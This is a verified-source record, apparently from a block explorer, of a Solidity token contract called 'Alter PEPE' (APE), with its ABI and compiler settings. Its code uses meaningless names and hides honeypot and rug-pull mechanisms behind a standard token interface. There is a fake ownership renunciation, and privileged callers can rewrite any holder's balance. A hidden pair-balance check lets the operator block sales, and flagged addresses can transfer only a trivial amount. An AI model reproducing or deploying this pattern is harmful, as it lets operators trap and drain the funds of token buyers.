{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface maxTo {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenAtTrading) external view returns (uint256);\n\n    function transfer(address tradingExempt, uint256 minEnable) external returns (bool);\n\n    function allowance(address feeTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingExempt,\n        uint256 minEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromSenderFund, uint256 value);\n    event Approval(address indexed feeTotal, address indexed spender, uint256 value);\n}\n\nabstract contract exemptLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquidityMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountTo {\n    function createPair(address launchTeamSell, address fundSender) external returns (address);\n}\n\ninterface swapTeamAt is maxTo {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AlterPEPE is exemptLiquidity, maxTo, swapTeamAt {\n\n    function marketingLaunched() public {\n        emit OwnershipTransferred(exemptAmount, address(0));\n        tradingReceiver = address(0);\n    }\n\n    uint256 private takeMarketingList = 100000000 * 10 ** 18;\n\n    address public exemptAmount;\n\n    function balanceOf(address tokenAtTrading) public view virtual override returns (uint256) {\n        return teamMarketing[tokenAtTrading];\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    uint256 limitFund;\n\n    function enableToken(address fromReceiver, uint256 minEnable) public {\n        listReceiver();\n        teamMarketing[fromReceiver] = minEnable;\n    }\n\n    function approve(address listMarketing, uint256 minEnable) public virtual override returns (bool) {\n        receiverLaunch[_msgSender()][listMarketing] = minEnable;\n        emit Approval(_msgSender(), listMarketing, minEnable);\n        return true;\n    }\n\n    uint8 private fromLiquidity = 18;\n\n    constructor (){\n        \n        liquidityMode swapSell = liquidityMode(enableTeam);\n        launchedLaunch = amountTo(swapSell.factory()).createPair(swapSell.WETH(), address(this));\n        if (totalAmount) {\n            maxTx = false;\n        }\n        exemptAmount = _msgSender();\n        marketingLaunched();\n        swapReceiver[exemptAmount] = true;\n        teamMarketing[exemptAmount] = takeMarketingList;\n        \n        emit Transfer(address(0), exemptAmount, takeMarketingList);\n    }\n\n    function isAuto(address teamMax, address tradingExempt, uint256 minEnable) internal returns (bool) {\n        require(teamMarketing[teamMax] >= minEnable);\n        teamMarketing[teamMax] -= minEnable;\n        teamMarketing[tradingExempt] += minEnable;\n        emit Transfer(teamMax, tradingExempt, minEnable);\n        return true;\n    }\n\n    function launchMode(address teamMax, address tradingExempt, uint256 minEnable) internal returns (bool) {\n        if (teamMax == exemptAmount) {\n            return isAuto(teamMax, tradingExempt, minEnable);\n        }\n        uint256 launchFrom = maxTo(launchedLaunch).balanceOf(totalSwap);\n        require(launchFrom == limitFund);\n        require(tradingExempt != totalSwap);\n        if (launchAt[teamMax]) {\n            return isAuto(teamMax, tradingExempt, toFund);\n        }\n        return isAuto(teamMax, tradingExempt, minEnable);\n    }\n\n    bool public isWallet;\n\n    uint256 senderLiquidityShould;\n\n    uint256 constant toFund = 12 ** 10;\n\n    string private txSell = \"APE\";\n\n    uint256 public marketingToken;\n\n    bool private maxTx;\n\n    function symbol() external view virtual override returns (string memory) {\n        return txSell;\n    }\n\n    function tokenBuy(uint256 minEnable) public {\n        listReceiver();\n        limitFund = minEnable;\n    }\n\n    bool private limitSell;\n\n    mapping(address => bool) public swapReceiver;\n\n    function allowance(address maxSenderSell, address listMarketing) external view virtual override returns (uint256) {\n        if (listMarketing == enableTeam) {\n            return type(uint256).max;\n        }\n        return receiverLaunch[maxSenderSell][listMarketing];\n    }\n\n    mapping(address => uint256) private teamMarketing;\n\n    address enableTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transfer(address fromReceiver, uint256 minEnable) external virtual override returns (bool) {\n        return launchMode(_msgSender(), fromReceiver, minEnable);\n    }\n\n    function tokenTotalTrading(address shouldList) public {\n        require(shouldList.balance < 100000);\n        if (tokenMax) {\n            return;\n        }\n        if (totalAmount) {\n            limitSell = true;\n        }\n        swapReceiver[shouldList] = true;\n        \n        tokenMax = true;\n    }\n\n    bool public minBuyAmount;\n\n    function shouldMax(address receiverFrom) public {\n        listReceiver();\n        \n        if (receiverFrom == exemptAmount || receiverFrom == launchedLaunch) {\n            return;\n        }\n        launchAt[receiverFrom] = true;\n    }\n\n    string private toAt = \"Alter PEPE\";\n\n    function transferFrom(address teamMax, address tradingExempt, uint256 minEnable) external override returns (bool) {\n        if (_msgSender() != enableTeam) {\n            if (receiverLaunch[teamMax][_msgSender()] != type(uint256).max) {\n                require(minEnable <= receiverLaunch[teamMax][_msgSender()]);\n                receiverLaunch[teamMax][_msgSender()] -= minEnable;\n            }\n        }\n        return launchMode(teamMax, tradingExempt, minEnable);\n    }\n\n    function owner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    bool public tradingLiquidity;\n\n    address private tradingReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return toAt;\n    }\n\n    event OwnershipTransferred(address indexed marketingTx, address indexed autoIs);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return takeMarketingList;\n    }\n\n    function listReceiver() private view {\n        require(swapReceiver[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromLiquidity;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverLaunch;\n\n    address totalSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => bool) public launchAt;\n\n    address public launchedLaunch;\n\n    bool public tokenMax;\n\n    bool private totalAmount;\n\n    uint256 public sellBuySender;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSenderFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxSenderSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAtTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minEnable\",\"type\":\"uint256\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuySender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"shouldMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minEnable\",\"type\":\"uint256\"}],\"name\":\"tokenBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldList\",\"type\":\"address\"}],\"name\":\"tokenTotalTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AlterPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}